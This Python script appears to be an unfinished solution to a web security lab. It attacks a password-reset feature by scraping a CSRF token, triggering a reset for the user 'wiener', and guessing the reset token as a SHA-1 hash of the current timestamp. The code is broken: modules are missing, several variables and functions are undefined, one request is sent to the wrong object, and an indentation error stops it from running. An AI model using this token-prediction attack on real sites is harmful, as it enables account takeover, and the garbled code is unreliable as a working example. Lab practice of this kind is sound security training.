import requests
from string import ascii_lowercase, digits, ascii_uppercase
import threading
import sys
import requests
import re

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
login_url = burp_url + '/login'
forgot_url = burp_url + '/forgot-password'


session = requests.Session()

response = session.get(forgot_url)
csrf = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text).group(1)

time_seed = time.time()
response = requests.post(response, headers=HEADERS, data=data)
print(f"Elapsed time of request: {response.elapsed.total_seconds()}")
print(f"Sending reset request for {username}", f"time: {time_seed}")

potential_token = hashlib.sha1(f"{int(time_seed)}".encode()).hexdigest()
print(f"Potential token: {potential_token}")


if "Please check your email for a reset password link." in response.text:
print(f"Reset request sent for {username}")


csrf_token = get_csrf_token()
data = {"csrf": csrf_token, "username": wiener }

#send_reset_request("wiener")
